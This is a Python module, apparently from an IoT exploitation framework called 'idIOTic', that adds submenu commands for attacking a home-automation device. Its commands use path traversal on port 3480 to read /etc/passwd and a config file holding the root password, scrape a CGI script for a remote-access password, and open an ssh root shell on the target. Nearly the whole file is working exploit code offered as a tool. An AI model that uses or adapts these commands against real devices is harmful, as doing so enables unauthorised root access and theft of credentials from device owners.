"""
Sub Command Example.

This is an idIOTic submenu command example. 
1. You create a class that inherits from "AnotherUI"
2. Give that same class a docstring (this will be the 'help' in the CLI)
3. Any method of that class that starts with "do_" will be automatically
    a command in the submenu. 
4. The docstring of the method will be the help for the command.
5. You'll have to edit idIOTic.py adding a command to the toplevel idIOTic menu (see "do_subcmdexample()")
    in idIOTic.py for an example.
6. That's it.

  Note: eventually we will use the "automatic import" technique that we use for basic "execute()" style
        modules, so that you dont have to modify idIOTic.py to have a command to invoke...it will
        be done automatically...but for now I am being lazy, so this is how it is done.

"""
from modules.mods import * #Any modules that plan to be idIOTic submenu command need this line

class SuCasa(AnotherUI):
    """
        Sucasa Ext is a more interactive version of the "sucasa" command. 
        It extends idIOTic to make functions available via a submenu.
    """

    def do_getpasswordfile(self,args): 
        """
            Use a vulnerability in the target to fetch the password file from the remote system.

            Usage:
                getpasswordfile <ip address of target>

        """
        from urllib.request import urlopen
#        import pdb;pdb.set_trace()
        ip = args #das right, ghettostyles. caution to the wind. No error checkin. whatevs.
        print("[+] grabbing /etc/passwd...\n")
        url = "http://"+str(ip)+":3480/data_request?id=file&parameters=../../etc/passwd"
        print(urlopen(url).read())

    def do_setremoteroot(self, args):
        """
            Use a vulnerability in the target to set a remote root password. 

            Usage:
                setremoteroot <ip address of target>

        """
        from urllib.request import urlopen
#        import pdb;pdb.set_trace()
        ip = args #das right, ghettostyles. caution to the wind. No error checkin. whatevs.
        url = "http://"+str(ip)+"/cgi-bin/cmh/tech_ra.sh"
        password = str(urlopen(url).read().split("-")[1].split(" to the")[0])
        print("[+] adding remote user, uid=0,gid=0, password = %s" %password)

        print("[+] new /etc/passwd...\n")
        url = "http://"+str(ip)+":3480/data_request?id=file&parameters=../../etc/passwd"
        #print(urlopen(url).read())
        print("[+] Ok done... ;-)")
        print("[+] Use the 'getrootshell' command in idIOTic or in a shell")
        print("[+] please exit idIOTic, and enter 'ssh remote@%(a)s' and then enter the password %(b)s" % {'a':ip,'b':password})

    def do_getrootpassword(self, args):
        """
            Use another vulnerability in the target to retrieve the root password. 

            Usage:
                getrootpassword <ip address of target>

        """
        from urllib.request import urlopen
#        import pdb;pdb.set_trace()
        ip = args #das right, ghettostyles. caution to the wind. No error checkin. whatevs.
        url = "http://"+str(ip)+"/port_3480/data_request?id=file&parameters=../../etc/cmh/cmh.conf"
        password = urlopen(url).read().split('\n')[9].split('=')[1]
        print("[+] root password is '%s'" %password)


        password = str(urlopen(url).read().split('\n')[9].split('=')[1])

    def do_getrootshell(self, args):
        """
            Connect to your rootshell on the remote device.
            This command needs to be executed after "setremoteroot"
            
            Usage:
                getrootshell <ip address of target>
        """
        import subprocess
#        import pdb;pdb.set_trace()
        ip = args #das right, ghettostyles. caution to the wind. No error checkin. whatevs.
        host = "remote@"+ip
        print("[+] Connecting to rootshell...remember to enter the password supplied by 'setremoteroot'");
        ret = subprocess.call(["ssh", host])
        
    def fetch_firmware(self, args):
        """
            Download the firmware from the official vendor site.

            Usage:
                fetchfirmware 
        """
        pass 
